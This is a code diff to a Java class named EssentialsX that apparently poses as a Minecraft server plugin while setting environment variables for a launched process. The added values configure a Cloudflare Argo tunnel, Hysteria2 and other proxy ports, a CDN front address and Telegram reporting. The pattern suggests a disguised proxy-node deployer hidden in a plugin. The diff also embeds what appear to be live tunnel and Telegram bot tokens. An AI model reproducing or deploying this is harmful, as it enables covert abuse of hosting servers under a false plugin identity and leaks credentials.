@@ -73,26 +73,26 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
-        env.put("FILE_PATH", "./world");
+        env.put("UUID", "a217d527-bd5e-4ef0-b899-d36627af0ddd");
+        env.put("FILE_PATH", "./logs");
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
+        env.put("ARGO_DOMAIN", "hoster.1976.dpdns.org");
+        env.put("ARGO_AUTH", "eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiMDRkMmQ0MmUtNWMyNi00NzY1LTk3ZTItMDJkOTFjZjI0YmQ3IiwicyI6Ill6RTVZVEk0TmpBdE1XWmpZaTAwWXpka0xUaGhOMlV0WTJRNVlqZzBPVEZrT1RKaiJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "");
+        env.put("HY2_PORT", "34346");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
-        env.put("CHAT_ID", "");
-        env.put("BOT_TOKEN", "");
-        env.put("CFIP", "spring.io");
+        env.put("CHAT_ID", "6708152473");
+        env.put("BOT_TOKEN", "7615526848:AAGVWjn03O5rdWiacPhtcl6TexJ7DQFTFb8");
+        env.put("CFIP", "cdns.doon.eu.org");
         env.put("CFPORT", "443");
-        env.put("NAME", "");
+        env.put("NAME", "hoster");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
